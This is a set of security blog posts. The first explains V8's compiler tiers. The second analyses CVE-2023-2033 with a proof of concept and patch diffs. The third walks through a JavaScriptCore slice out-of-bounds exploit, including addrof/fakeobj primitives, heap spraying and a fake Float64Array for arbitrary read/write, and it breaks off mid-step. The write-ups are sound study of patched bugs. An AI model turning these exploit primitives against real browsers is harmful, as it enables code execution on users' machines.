[{"content":"Understanding V8\u0026rsquo;s Compiler Pipeline Introduction V8 is the JavaScript engine powering browsers like Google Chrome, Brave, and Microsoft Edge. This series of blog posts will go into the internals of V8. This first part will be giving an overview of the V8 Compiler Pipeline.\nCompiler Pipeline High-Level Overview: The Life Cycle of a JavaScript Source in the V8 Engine Just-In-Time (JIT) Compilation involves executing bytecode through an interpreter VM, which is slower than running machine code directly. Most compilers, including V8, follow a similar initial compilation pipeline:\n Source Code to Abstract Syntax Tree (AST) AST to Bytecode  V8 begins by converting source code into tokens, which are then transformed into an AST. This AST is subsequently converted into V8 bytecode. The AST serves as an Intermediate Representation (IR), providing a layer of abstraction used for translation and optimization.\nParser JavaScript code first passes through a parser, which breaks down the code into tokens (a process called tokenization). These tokens are then converted into an Abstract Syntax Tree (AST).\nIgnition Ignition, the interpreter stage, walks through the AST, converting it into V8 bytecode and executing it.\nSparkplug Sparkplug is a non-optimizing compiler stage that iterates over the bytecode generated by Ignition, converting it into machine code for each bytecode as it loops.\nMaglev Maglev marks the start of optimizations in machine code. It\u0026rsquo;s a mid-tier optimizing compiler that converts machine code into SSA (Static Single Assignment) nodes. This phase mainly involves two stages: building a graph and optimizing phi values.\nTurbofan In the Turbofan phase, JIT compilation occurs, translating bytecode into highly optimized machine code.\nHot Functions and Tiered Compilation When a JavaScript function is executed repeatedly, it becomes \u0026lsquo;hot\u0026rsquo; and is sent to the next tier in the pipeline. Each tier gathers profiling information during multiple executions, aiding speculative optimization. To validate the optimized code, checks are placed in the optimized code. If the function behaves unexpectedly, i.e the checks fail, it deoptimizes\nWhy Is Optimization Necessary? Consider a simple operation like a + b. In JavaScript, unlike ahead-of-time compiled languages like C/C++, the engine doesn\u0026rsquo;t initially know the types of the variables involved. The operation could be an integer addition or a string concatenation. Based on the ECMAScript Specification, V8 performs various checks whenever it encounters a \u0026ldquo;+\u0026rdquo; to determine the correct operation.\nHere\u0026rsquo;s the ECMAScript Specification for the \u0026ldquo;+\u0026rdquo; Operator:\n1 2 3 4 5 6 7  13.8.1 The Addition Operator ( + ) NOTE The addition operator either performs string concatenation or numeric addition. 13.8.1.1 Runtime Semantics: Evaluation AdditiveExpression : AdditiveExpression + MultiplicativeExpression 1. Return ? EvaluateStringOrNumericBinaryExpression(AdditiveExpression, +, MultiplicativeExpression).   1 2 3 4 5 6 7 8  13.15.4 EvaluateStringOrNumericBinaryExpression ( leftOperand, opText, rightOperand ) The abstract operation EvaluateStringOrNumericBinaryExpression takes arguments leftOperand (a Parse Node), opText (a sequence of Unicode code points), and rightOperand (a Parse Node) and returns either a normal completion containing either a String, a BigInt, or a Number, or an abrupt completion. It performs the following steps when called: 1. Let lref be ? Evaluation of leftOperand. 2. Let lval be ? GetValue(lref). 3. Let rref be ? Evaluation of rightOperand. 4. Let rval be ? GetValue(rref). 5. Return ? ApplyStringOrNumericBinaryOperator(lval, opText, rval).   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  13.15.3 ApplyStringOrNumericBinaryOperator ( lval, opText, rval ) The abstract operation ApplyStringOrNumericBinaryOperator takes arguments lval (an ECMAScript language value), opText (**, *, /, %, +, -, \u0026lt;\u0026lt;, \u0026gt;\u0026gt;, \u0026gt;\u0026gt;\u0026gt;, \u0026amp;, ^, or |), and rval (an ECMAScript language value) and returns either a normal completion containing either a String, a BigInt, or a Number, or a throw completion. It performs the following steps when called: 1. If opText is +, then a. Let lprim be ? ToPrimitive(lval). b. Let rprim be ? ToPrimitive(rval). c. If lprim is a String or rprim is a String, then i. Let lstr be ? ToString(lprim). ii. Let rstr be ? ToString(rprim). iii. Return the string-concatenation of lstr and rstr. d. Set lval to lprim. e. Set rval to rprim. 2. NOTE: At this point, it must be a numeric operation. 3. Let lnum be ? ToNumeric(lval). 4. Let rnum be ? ToNumeric(rval). 5. If Type(lnum) is not Type(rnum), throw a TypeError exception. 6. If lnum is a BigInt, then a. If opText is **, return ? BigInt::exponentiate(lnum, rnum). b. If opText is /, return ? BigInt::divide(lnum, rnum). c. If opText is %, return ? BigInt::remainder(lnum, rnum). d. If opText is \u0026gt;\u0026gt;\u0026gt;, return ? BigInt::unsignedRightShift(lnum, rnum). 7. Let operation be the abstract operation associated with opText and Type(lnum) in the following table: opText\tType(lnum)\toperation **\tNumber\tNumber::exponentiate *\tNumber\tNumber::multiply *\tBigInt\tBigInt::multiply /\tNumber\tNumber::divide %\tNumber\tNumber::remainder +\tNumber\tNumber::add +\tBigInt\tBigInt::add -\tNumber\tNumber::subtract -\tBigInt\tBigInt::subtract \u0026lt;\u0026lt;\tNumber\tNumber::leftShift \u0026lt;\u0026lt;\tBigInt\tBigInt::leftShift \u0026gt;\u0026gt;\tNumber\tNumber::signedRightShift \u0026gt;\u0026gt;\tBigInt\tBigInt::signedRightShift \u0026gt;\u0026gt;\u0026gt;\tNumber\tNumber::unsignedRightShift \u0026amp;\tNumber\tNumber::bitwiseAND \u0026amp;\tBigInt\tBigInt::bitwiseAND ^\tNumber\tNumber::bitwiseXOR ^\tBigInt\tBigInt::bitwiseXOR |\tNumber\tNumber::bitwiseOR |\tBigInt\tBigInt::bitwiseOR 8. Return operation(lnum, rnum).   All these steps for a seemingly simple addition highlight why optimization is crucial. V8 engages in \u0026ldquo;speculation\u0026rdquo; during the execution of JavaScript code, collecting information to use when the engine decides to tier up, thus producing optimized code.\nSpeculative Optimization Due to the dynamic nature of JavaScript, there\u0026rsquo;s little initial information about the code to be executed. Consider a function func adding two variables x and y, which are expected to be numbers. V8 can optimize by skipping checks if it knows x and y are numbers through repeated execution and profiling.\nAfter Ignition generates the bytecode, the bytecode runs for a while. This is when the code gets ‘hot’. Meanwhile, it gathers feedback and stores it in the Feedback Vector(which is the structure containing the profiling data)``\nThe Feedback Vector stores all the information about the loads, stores, etc. This bytecode, along with the feedback vector, is fed into the next tier of the compilation pipeline.\nThe purpose of this process is to speculate about the code and produce optimized code.\nSea Of Nodes The Turbofan first converts each bytecode instruction into a collection of nodes which results in a representation called Sea of Nodes. It combines aspects of both Data Flow Graphs (DFG) and Control Flow Graphs (CFG).\nSea of Nodes graphs have three types of edges:\n  Value Edges: Represent the flow of data between operations.\n  Control Edges: Dictate the program\u0026rsquo;s control flow.\n  Effect Edges: Ensure operations are executed in the correct order.\nsource: Introduction to TurboFan (doar-e.github.io)\n  So, all the optimizations happen in the sea of node graph.\nNext part of this series will be focusing on Turbofan and how it uses Sea of Nodes during various optimizations phases.\n","date":"2024-01-02T06:32:41+05:30","permalink":"https://sanjayvardhan.github.io/posts/v8-internals-understanding-v8-compiler-pipeline/","title":"V8 Internals - Understanding V8 Compiler Pipeline"},{"content":"Introduction I have been following v8 exploits related to hole for sometime now and I found CVE-2023-2033 really interesting. So I thought documenting whatever I learn while doing the analysis of this CVE will help me understand it even better.\nHole Generally in JavaScript, A Hole to an empty slot in an array. These holes are different from undefined or null values, which are actual values that can be assigned to array elements.\nFor example, if you create an array like this:\n1 2  var arr = [1, 2, 3]; arr.length = 5;   The array arr will have two holes at the end.\nNow lets see how this looks like in v8, We can use %DebugPrint(arr) so get debug information of the array.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  d8\u0026gt; %DebugPrint(arr) DebugPrint: 0x38ae001c9415: [JSArray] - map: 0x38ae000cef71 \u0026lt;Map[16](HOLEY_SMI_ELEMENTS)\u0026gt; [FastProperties] - prototype: 0x38ae000ce925 \u0026lt;JSArray[0]\u0026gt; - elements: 0x38ae001cb0fd \u0026lt;FixedArray[20]\u0026gt; [HOLEY_SMI_ELEMENTS] - length: 5 - properties: 0x38ae000006cd \u0026lt;FixedArray[0]\u0026gt; - All own properties (excluding elements): { 0x38ae00000d41: [String] in ReadOnlySpace: #length: 0x38ae0030f6f9 \u0026lt;AccessorInfo name= 0x38ae00000d41 \u0026lt;String[6]: #length\u0026gt;, data= 0x38ae00000061 \u0026lt;undefined\u0026gt;\u0026gt; (const accessor descriptor), location: descriptor } - elements: 0x38ae001cb0fd \u0026lt;FixedArray[20]\u0026gt; { 0: 1 1: 2 2: 3 3-19: 0x38ae000006e9 \u0026lt;the_hole_value\u0026gt; } 0x38ae000cef71: [Map] in OldSpace - map: 0x38ae000c3c29 \u0026lt;MetaMap (0x38ae000c3c79 \u0026lt;NativeContext[285]\u0026gt;)\u0026gt; - type: JS_ARRAY_TYPE - instance size: 16 - inobject properties: 0 - unused property fields: 0 - elements kind: HOLEY_SMI_ELEMENTS - enum length: invalid - back pointer: 0x38ae000ce6b1 \u0026lt;Map[16](PACKED_SMI_ELEMENTS)\u0026gt; - prototype_validity cell: 0x38ae00000a31 \u0026lt;Cell value= 1\u0026gt; - instance descriptors #1: 0x38ae000cef3d \u0026lt;DescriptorArray[1]\u0026gt; - transitions #1: 0x38ae000cef99 \u0026lt;TransitionArray[4]\u0026gt;Transition array #1: 0x38ae00000e05 \u0026lt;Symbol: (elements_transition_symbol)\u0026gt;: (transition to PACKED_DOUBLE_ELEMENTS) -\u0026gt; 0x38ae000cefb1 \u0026lt;Map[16](PACKED_DOUBLE_ELEMENTS)\u0026gt; - prototype: 0x38ae000ce925 \u0026lt;JSArray[0]\u0026gt; - constructor: 0x38ae000ce61d \u0026lt;JSFunction Array (sfi = 0x38ae00335da5)\u0026gt; - dependent code: 0x38ae000006dd \u0026lt;Other heap object (WEAK_ARRAY_LIST_TYPE)\u0026gt; - construction counter: 0 [1, 2, 3, , ]   You can see that the elements kind for this array is HOLEY_SMI_ELEMENTS. SMI is used to represent small integers. and you can see that the elements after arr[2] are holes.\nV8 uses a special object to represent these holes called TheHole. It is an internal implementation which never leaks(or should never) in the JavaScript code. since this is a special object it is handled differently in various places in v8. this special handling is what lead to a lot vulnerabilities in the past.\nSetup 1 2 3 4 5 6 7 8  spektre@skream:~$ fetch v8 spektre@skream:~$ cd v8 spektre@skream:~/v8$ ./build/install-build-deps.sh # Assumes you\u0026#39;re using apt spektre@skream:~/v8$ git checkout f7a3499f6d7e50b227a17d2bbd96e4b59a261d3c spektre@skream:~/v8$ ./tools/dev/v8gen.py x64.release spektre@skream:~/v8$ ninja -C ./out.gn/x64.release # Release version spektre@skream:~/v8$ ./tools/dev/v8gen.py x64.debug spektre@skream:~/v8$ ninja -C ./out.gn/x64.debug # Debug version    Bug Analysis POC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  var h0le = [Object]; function boom() { var h00le = h0le; function rGlobal() { h00le[0] = stack; return h00le; } Error.captureStackTrace(globalThis); Error.prepareStackTrace = function() { Reflect.deleteProperty(Error, \u0026#39;prepareStackTrace\u0026#39;); Reflect.deleteProperty(globalThis, \u0026#39;stack\u0026#39;); Reflect.defineProperty( globalThis, \u0026#39;stack\u0026#39;, {configurable: false, writable: true, enumerable: true, value: 1}); stack = undefined; for (let i = 0; i \u0026lt; 0x5000; i++) { rGlobal(); } return undefined; }; Reflect.defineProperty( globalThis, \u0026#39;stack\u0026#39;, {configurable: true, writable: true, enumerable: true, value: undefined}); delete globalThis.stack; rGlobal(); %DebugPrint(h0le[0]); } boom();   First, we call Error.captureStackTrace():\n This function captures the current stack trace and stores it in a private symbol property. It creates a “v8 api/native accessor” (AccessorInfo) property for stack. In V8, AccessorInfo objects are used to store information about custom getter and setter functions.  Overriding Error.prepareStackTrace:\n The prepareStackTrace function is redefined by the user. This function is called whenever the stack property of an Error object is accessed.  Call Object.defineProperty on globalThis, \u0026ldquo;stack\u0026rdquo;, with the specified properties {...}:\n To define a property descriptor, it\u0026rsquo;s necessary to first get the current property descriptor. This action invokes JSReceiver::GetOwnPropertyDescriptor. Since stack is an AccessorInfo (and not a standard \u0026ldquo;JavaScript accessor\u0026rdquo; represented by AccessorPair), the process involves calling Object::GetProperty. This leads to the invocation of the user-defined Error.prepareStackTrace function, which formats the stack trace.  Invoke the user-defined Error.prepareStackTrace function during the execution of Object.defineProperty:\n  Delete the Old \u0026lsquo;stack\u0026rsquo; Property: Remove the existing stack property from globalThis, using its configurable attribute set to true.\n  Define a New \u0026lsquo;stack\u0026rsquo; Data Property: Create a new stack data property on globalThis. This property is made writable but non-configurable.\n  Transition PropertyCell Type: Modify the stack property to change its PropertyCell type to kMutable.\n  Trigger TurboFan Optimization: Optimize the function loading stack with TurboFan (V8\u0026rsquo;s optimizing compiler), due to the new status of stack as a non-configurable and mutable property.\n Optimize LoadGlobal Operation:  Optimize the LoadGlobal operation to load from a HeapConstant PropertyCell.   Bypass De-optimization Checks:  No lazy de-optimization compilation dependencies are installed during this process.      After the user-defined Error.prepareStackTrace function completes, Object.defineProperty() continues with the descriptor returned earlier (which does not reflect the changes made inside Error.prepareStackTrace).\n  The stack property is updated to {value: 1, configurable: true}, contradicting the non-configurable state assumed by the JIT-optimized code.\n  Upon deletion of the stack property, the PropertyCell is cleared and transitions into a state with a value known as \u0026ldquo;The Hole\u0026rdquo;.\n  The TurboFan-optimized function then tries to access the stack property, expecting a non-configurable, mutable property. Instead, it retrieves the cleared PropertyCell, which now contains \u0026ldquo;The Hole\u0026rdquo;.\n  Patch Analysis There were two fixes for this bug.\nPatch 1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  diff --git [a/src/builtins/builtins-error.cc](https://chromium.googlesource.com/v8/v8/+/f7a3499f6d7e50b227a17d2bbd96e4b59a261d3c/src/builtins/builtins-error.cc) [b/src/builtins/builtins-error.cc](https://chromium.googlesource.com/v8/v8/+/fa81078cca6964def7a3833704e0dba7b05065d8/src/builtins/builtins-error.cc) index 01e0162..14c0602 100644 --- a/src/builtins/builtins-error.cc +++ b/src/builtins/builtins-error.cc  @@ -35,6 +35,9 @@  THROW_NEW_ERROR_RETURN_FAILURE( isolate, NewTypeError(MessageTemplate::kInvalidArgument, object_obj)); } + if (object_obj-\u0026gt;IsJSGlobalProxy()) { + return ReadOnlyRoots(isolate).undefined_value(); + }  Handle\u0026lt;JSObject\u0026gt; object = Handle\u0026lt;JSObject\u0026gt;::cast(object_obj); Handle\u0026lt;Object\u0026gt; caller = args.atOrUndefined(isolate, 2);   This introduced a simple check to return undefined value If object_obj is a JSGlobalProxy I think this patch was a temporary fix as they introduced another patch after few days for a better fix\nPatch 2 :\nThe patch notes itself is pretty much self explanatory here:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  [error] Define Error.stack property as a JavaScript accessor ... instead of the native data property. This fixes the JS spec violation when reading a data property does not expect any observable side effects. For example, OrdinaryGetOwnProperty (see [https://tc39.es/ecma262/#sec-ordinarygetownproperty](https://tc39.es/ecma262/#sec-ordinarygetownproperty), step 4a). Differences to previous behaviour: - Error.stack is defined as a JavaScript accessor property. - all Error objects get a private \u0026#34;error_stack_symbol\u0026#34; field where the captured stack trace is stored (previously it was added only when the error was actually thrown which caused unnecessary transitions). - Error.captureStackTrace(obj) adds public \u0026#34;stack\u0026#34; accessor property and private \u0026#34;error_stack_symbol\u0026#34; property to given \u0026#34;obj\u0026#34;. - calling \u0026#34;stack\u0026#34; getter/setter is a no-op in case receiver is not an \u0026#34;Error-like\u0026#34; object, i.e. it doesn\u0026#39;t have a \u0026#34;error_stack_symbol\u0026#34; property and it doesn\u0026#39;t have a prototype with such a property (the lookup stops at JSProxy or interceptor). - the \u0026#34;stack\u0026#34; getter walks the prototype chain from receiver until it finds a holder with the \u0026#34;error_stack_symbol\u0026#34; property which is then used for computing the result. This is slightly different from the previous behaviour in case receiver\u0026#39;s prototype chain contains multiple error objects. - the \u0026#34;stack\u0026#34; setter walks the prototype chain from receiver until it finds a holder with the \u0026#34;error_stack_symbol\u0026#34; property and stores the value there.   Conclusion I have learnt a lot while doing analysis for this CVE, and the next blog post will be about how this vulnerability was exploited. If you find my mistakes or have any doubts/suggestions feel free to contact me :)\n","date":"2024-01-02T06:24:00+05:30","permalink":"https://sanjayvardhan.github.io/posts/the-holy-hole-analysis-of-cve-2023-2033/","title":"The Holy Hole - Analysis of CVE-2023-2033"},{"content":"Bug Analysis The vulnerability is present in the (slightly commented) implementation of ArrayProtoSlice.\nfirst, let us see what is slice method and how it works.\nThe slice() method returns a shallow copy of a portion of an array into a new array object selected from start to end (end not included) where start and end represent the index of items in that array. The original array will not be modified.\n1 2 3 4  \u0026gt;\u0026gt;\u0026gt; var array = [\u0026#39;a\u0026#39;,\u0026#39;b\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39;d\u0026#39;] undefined \u0026gt;\u0026gt;\u0026gt; array.slice(1,4) b,c,d   Now let us take a look at the implementation (slightly commented) of ArrayProtoSlice.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53  EncodedJSValue JSC_HOST_CALL arrayProtoFuncSlice(ExecState* exec) { VM\u0026amp; vm = exec-\u0026gt;vm(); auto scope = DECLARE_THROW_SCOPE(vm); JSObject* thisObj = exec-\u0026gt;thisValue().toThis(exec, StrictMode).toObject(exec); ASSERT(!!scope.exception() == !thisObj); if (UNLIKELY(!thisObj)) return { }; unsigned length = toLength(exec, thisObj); // Get the length of the array  RETURN_IF_EXCEPTION(scope, { }); unsigned begin = argumentClampedIndexFromStartOrEnd(exec, 0, length); // Get the start index for slicing the array.  RETURN_IF_EXCEPTION(scope, { }); unsigned end = argumentClampedIndexFromStartOrEnd(exec, 1, length, length); // Get the end index for slicing the array.  RETURN_IF_EXCEPTION(scope, { }); if (end \u0026lt; begin) // Ensure end index is greater than or equal to the begin index  end = begin; std::pair\u0026lt;SpeciesConstructResult, JSObject*\u0026gt; speciesResult = speciesConstructArray(exec, thisObj, end - begin); // We can only get an exception if we call some user function.  ASSERT(!!scope.exception() == (speciesResult.first == SpeciesConstructResult::Exception)); if (UNLIKELY(speciesResult.first == SpeciesConstructResult::Exception)) return { }; // Check if the result object is an array object, to take fast path.  bool okToDoFastPath = speciesResult.first == SpeciesConstructResult::FastPath \u0026amp;\u0026amp; isJSArray(thisObj); RETURN_IF_EXCEPTION(scope, { }); if (LIKELY(okToDoFastPath)) { if (JSArray* result = asArray(thisObj)-\u0026gt;fastSlice(*exec, begin, end - begin)) return JSValue::encode(result); } // Create a new result object using the species constructor  JSObject* result; if (speciesResult.first == SpeciesConstructResult::CreatedObject) result = speciesResult.second; else { result = constructEmptyArray(exec, nullptr, end - begin); RETURN_IF_EXCEPTION(scope, { }); } // Copy the elements from the original array object to the result object  unsigned n = 0; for (unsigned k = begin; k \u0026lt; end; k++, n++) { JSValue v = getProperty(exec, thisObj, k); RETURN_IF_EXCEPTION(scope, { }); if (v) { result-\u0026gt;putDirectIndex(exec, n, v, 0, PutDirectIndexShouldThrow); RETURN_IF_EXCEPTION(scope, { }); } } scope.release(); setLength(exec, vm, result, n); return JSValue::encode(result); }   Simply put, the above code gets the length of the array and converts the args into native integers to get start and end values. Then performs slicing. The slicing is done in two ways:\n FastSlice: Uses memcpy to copy the elements into a new array. Slow path: Loops and copies each element individually to the new array.  In the implementation of ArrayProtoSlice, the values are converted to native integers by argumentClampedIndexFromStartOrEnd().\n1 2  unsigned begin = argumentClampedIndexFromStartOrEnd(exec, 0, length); unsigned end = argumentClampedIndexFromStartOrEnd(exec, 1, length, length);   1 2 3 4 5 6 7 8 9 10 11 12 13  static inline unsigned argumentClampedIndexFromStartOrEnd(ExecState* exec, int argument, unsigned length, unsigned undefinedValue = 0) { JSValue value = exec-\u0026gt;argument(argument); if (value.isUndefined()) return undefinedValue; double indexDouble = value.toInteger(exec); if (indexDouble \u0026lt; 0) { indexDouble += length; return indexDouble \u0026lt; 0 ? 0 : static_cast\u0026lt;unsigned\u0026gt;(indexDouble); } return indexDouble \u0026gt; length ? length : static_cast\u0026lt;unsigned\u0026gt;(indexDouble); }   1 2 3 4  \u0026gt;\u0026gt;\u0026gt; a = [\u0026#39;1\u0026#39;,\u0026#39;2\u0026#39;,\u0026#39;3\u0026#39;,\u0026#39;4\u0026#39;,\u0026#39;5\u0026#39;] [1,2,3,4,5] \u0026gt;\u0026gt;\u0026gt; a.slice(1,3) [2,3]   Here we can see that even if the parameters are strings, they are converted to native integers.\nAccording to the conversion rules, if an object has a callable property valueOf, it will be called and the return value will be used if it is a primitive value. So, if we change the length using valueof function in one of the parameters, .slice still uses the old length value, So memcpy will now result in out-of-bound access.\nNow let us see what this looks like in action.\n1 2 3 4 5 6 7 8 9 10  var a = []; for (var i = 0; i \u0026lt; 100; i++) a.push(i + 1.23); var b = a.slice(0, { valueOf: function () { a.length = 0; b = [{}, 1.23]; return 5; }, }); print(b);   The expected output should be an array with undefined values. But\u0026hellip;\n1 2  spektre@skream:~/webkit$ ./WebKitBuild/Debug/bin/jsc poc.js 1.23,2.23,1.5488838078e-314,6.365987374e-314,6.94548287109343e-310   Here we abused the JS Type Conversions while calculating the \u0026lsquo;begin\u0026rsquo; and \u0026lsquo;end\u0026rsquo; variables during the fast path. During the conversion, valueOf method is executed, the length is set to 0, and the ArrayProtoSlice still uses the old length value which resulted in an Out-Of-Bounds read We can also use this not only to leak values but also to inject values as well.\nNow let us take a look at the commit(650552a) where this bug was patched.\n1 2 3 4 5 6 7 8 9 10 11 12 13  diff --git a/Source/JavaScriptCore/runtime/ArrayPrototype.cpp b/Source/JavaScriptCore/runtime/ArrayPrototype.cpp index cfdd7fceb7f47..08a6ec991afef 100644 --- a/Source/JavaScriptCore/runtime/ArrayPrototype.cpp +++ b/Source/JavaScriptCore/runtime/ArrayPrototype.cpp @@ -863,7 +863,7 @@ EncodedJSValue JSC_HOST_CALL arrayProtoFuncSlice(ExecState* exec)  if (UNLIKELY(speciesResult.first == SpeciesConstructResult::Exception)) return JSValue::encode(jsUndefined()); - if (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath \u0026amp;\u0026amp; isJSArray(thisObj))) { + if (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath \u0026amp;\u0026amp; isJSArray(thisObj) \u0026amp;\u0026amp; length == getLength(exec, thisObj))) {  if (JSArray* result = asArray(thisObj)-\u0026gt;fastSlice(*exec, begin, end - begin)) return JSValue::encode(result); }   Here the patch adds an additional check for the length of the source array before calling fastSlice.\nBefore we get into details of the exploit, Here are a few things you need to know that might help you understand the exploit better.\nNaN Boxing and JS Values In JSC, The least significant values are used to indicate which type of value it is. This is clearly defined in JSValue.h\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  * The encoding makes use of unused NaN space in the IEEE754 representation. Any value * with the top 13 bits set represents a QNaN (with the sign bit set). QNaN values * can encode a 51-bit payload. Hardware produced and C-library payloads typically * have a payload of zero. We assume that non-zero payloads are available to encode * pointer and integer values. Since any 64-bit bit pattern where the top 15 bits are * all set represents a NaN with a non-zero payload, we can use this space in the NaN * ranges to encode other values (however there are also other ranges of NaN space that * could have been selected). * * This range of NaN space is represented by 64-bit numbers beginning with the 15-bit * hex patterns 0xFFFC and 0xFFFE - we rely on the fact that no valid double-precision * numbers will fall in these ranges. * * The top 15-bits denote the type of the encoded JSValue: * * Pointer { 0000:PPPP:PPPP:PPPP * / 0002:****:****:**** * Double { ... * \\ FFFC:****:****:**** * Integer { FFFE:0000:IIII:IIII * * The scheme we have implemented encodes double precision values by performing a * 64-bit integer addition of the value 2^49 to the number. After this manipulation * no encoded double-precision value will begin with the pattern 0x0000 or 0xFFFE. * Values must be decoded by reversing this operation before subsequent floating point * operations may be peformed. * * 32-bit signed integers are marked with the 16-bit tag 0xFFFE. * * The tag 0x0000 denotes a pointer, or another form of tagged immediate. Boolean, * null and undefined values are represented by specific, invalid pointer values: * * False: 0x06 * True: 0x07 * Undefined: 0x0a * Null: 0x02   Consider this example. We create an array with an Integer, a double, a string, a bool, and an object.\n1  a = [0xdeadbeef,0.1337,\u0026#34;abcd\u0026#34;,true,{}]   1 2  \u0026gt;\u0026gt;\u0026gt; describe(a) Object: 0x7fffadfc4430 with butterfly 0x7fffaddd8288 (0x7fffadff3360:[Array, {}, ArrayWithContiguous, Proto:0x7fffadfd0120]), ID: 87   and this is how the values look in memory\n1 2 3 4  pwndbg\u0026gt; x/16gx 0x7fffaddd8288 0x7fffaddd8288: 0x41ecd5b7dde00000 0x3fc21d14e3bcd35b 0x7fffaddd8298: 0x00007fffa74ef940 0x0000000000000007 0x7fffaddd82a8: 0x00007fffadffc360 0x00000000badbeef0   JSObject An object in JS is a collection of Key-Value pairs, which are called properties.\nconsider this example.\n1  x = {\u0026#39;a\u0026#39;:1,\u0026#39;b\u0026#39;:0.1337,\u0026#39;c\u0026#39;:\u0026#34;lol\u0026#34;,\u0026#39;d\u0026#39;:true,\u0026#39;e\u0026#39;:[1,2,3,4]}   we can use describe() to get info about the object.\n1 2  \u0026gt;\u0026gt;\u0026gt; describe(x) Object: 0x7fffadffc1a0 with butterfly (nil) (0x7fffadf9ea30:[Object, {a:0, b:1, c:2, d:3, e:4}, NonArray, Proto:0x7fffadfc40a0, Leaf]), ID: 280   This is how the object looks in memory.\n1 2 3 4 5  pwndbg\u0026gt; x/16gx 0x7fffadffc1a0 0x7fffadffc1a0: 0x0100180000000118 0x0000000000000000 0x7fffadffc1b0: 0xffff000000000001 0x3fc21d14e3bcd35b 0x7fffadffc1c0: 0x00007fffadf94300 0x0000000000000007 0x7fffadffc1d0: 0x00007fffadfc4320 0x0000000000000000   Structure of a JSObject:\n1 2 3 4 5 6 7 8 9  -------------------- StructureID 32 bits -------------------- Header Bits 32 bits -------------------- Butterfly 64 bits -------------------- Inline Properties n*64 bits --------------------   Butterfly Butterfly consists of elements of the array and out-of-line properties. It\u0026rsquo;s called a butterfly because this points to the middle of the structure. The elements are at +ve offsets from the Butterfly pointer and out-of-line properties are at -ve offsets.\n1 2 3 4  \u0026gt;\u0026gt;\u0026gt; a = [0xdeadbeef,0.1337,\u0026#34;abcd\u0026#34;,true,{}] 3735928559,0.1337,abcd,true,[object Object] \u0026gt;\u0026gt;\u0026gt; describe(a) Object: 0x7fffadfc4340 with butterfly 0x7fffadde4108 (0x7fffadff3360:[Array, {}, ArrayWithContiguous, Proto:0x7fffadfd0120]), ID: 87   Here is how a butterfly is represented in memory:\n1 2 3 4 5  pwndbg\u0026gt; x/16gx 0x7fffadde4108 0x7fffadde4108: 0x41ecd5b7dde00000 0x3fc21d14e3bcd35b 0x7fffadde4118: 0x00007fffadf94360 0x0000000000000007 0x7fffadde4128: 0x00007fffadffc1e0 0x00000000badbeef0 0x7fffadde4138: 0x00000000badbeef0 0x00000000badbeef0   Exploit Strategy   First, we start with writing our exploit primitives addrof and fakeobj.\n  For addrof, We make use of an array of doubles, which will have its indexing type as ArrayWithDoubles. and use the valueof function to shrink the array, allocate an array with the object, and return a size larger than the array size which will access the object. slice preserves the indexing type, and the data we access is treated as native doubles which gives us JSValue leak which is in the form of 64bit Floating point value. fakeobj follows a similar approach but the other way around.\n  addrof primitive\n  1 2 3 4 5 6 7 8 9 10 11 12  function addrof(object) { var a = []; for (var i = 0; i \u0026lt; 100; i++) a.push(i + 0.123); var b = a.slice(0, { valueOf: function () { a.length = 0; b = [object]; return 5; }, }); return Int64.fromDouble(b[4]); }    fakeobj primitive  1 2 3 4 5 6 7 8 9 10 11 12 13  function fakeobj(addr) { var a = []; for (var i = 0; i \u0026lt; 100; i++) a.push({}); var b = a.slice(0, { valueOf: function () { a.length = 0; b = [addr.asDouble()]; return 5; }, }); return b[4]; } ```    Now we will aim to achieve arb read/write, we achieve this using a fake Float64Array Instance.  Why Float64Array? Typed Arrays store raw binary data, we can get arbitrary read/write if we control the data pointer.\nOk, Before we proceed further, To fake an object, We need a valid JSCell header and JS StructureID which is not static. In this case, We can predict a valid structure id by spraying a lot of objects and adding a different property each time which gives us a unique structure id.\n We now spray a lot of Float64Array instances and guess the structure id. we can check if the guess is correct using instanceof. After setting up the cell header of fake Float64Array, We make the vector ptr ( pointer to the backing memory ) of the fake object point to another array, which gives us arb read/write.  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  function spray() { for (var i = 0; i \u0026lt; 10000; i++) { var a = new Float64Array(1); elem = \u0026#34;aaa\u0026#34; + i; a[elem] = 0xdeadbeef; } } spray(); var temp = new Uint8Array(1000); /* JS cell header for a Float64Array m_structureID m_indexingType m_type m_flags m_cellState */ var jsCellHeader = new Int64([ 0x0,0x10,0x0,0x0, 0x0, 0x2c, 0x08, 0x1, ]); var container = { jsCellHeader: jsCellHeader.asJSValue(), butterfly: false, // Can\u0026#39;t use 0x0 here because of conversion to JSValue, so we use false  vector: temp, lengthAndFlags: new Int64(\u0026#34;0x0001000000000100\u0026#34;).asJSValue(), };   1 2 3 4 5 6 7 8 9 10 11  memory = { read: function (addr, length) { fakearray[2] = addr.asDouble(); var res = new Array(length); for (var i = 0; i \u0026lt; length; i++) res[i] = temp[i]; return res; }, write: function (addr, data) { fakearray[2] = addr.asDouble(); for (var i = 0; i \u0026lt; data.length; i++) temp[i] = data[i]; },    The butterfly of the fake object is an invalid pointer, this causes a crash because of the garbage collector. we fix the fake object and the container to avoid a crash.  1 2 3 4 5 6 7 8 9 10  var empty = {}; var header = memory.read(addrof(empty), 8); memory.write(addrof(container), header); var arr = new Float64Array(8); header = memory.read(addrof(arr), 16); var length = memory.read(Add(addrof(arr), 24), 8); memory.write(addrof(fakearray), header); memory.write(Add(addrof(fakearray), 24), length); fakearray.container = container;    We now create a JITed region that has RWX permissions, and get the address of 